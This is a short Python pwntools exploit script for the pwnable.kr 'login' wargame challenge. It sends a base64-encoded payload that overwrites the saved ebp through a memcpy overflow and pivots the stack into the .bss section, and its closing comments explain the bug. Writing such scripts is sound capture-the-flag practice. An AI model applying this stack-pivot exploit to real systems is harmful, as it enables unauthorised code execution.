from pwn import *
from pwnlib.util.packing import p32
import os

p = remote('pwnable.kr', 9003)
# p = process("./login")
p.recvuntil("Authenticate : ")

payload = b'A'*4
# ret
payload += p32(0x08049284)
# fake ebp
payload += p32(0x811eb40)

payload = b64e(payload)
print(payload)
p.sendline(payload)

p.interactive()
p.close()

# pwn
# easier than I thought. I am silly
# An overflow inside auth.memcpy (ebp)
# change the stack to .bss section since pic is false
# our input firstly stayed in .bss
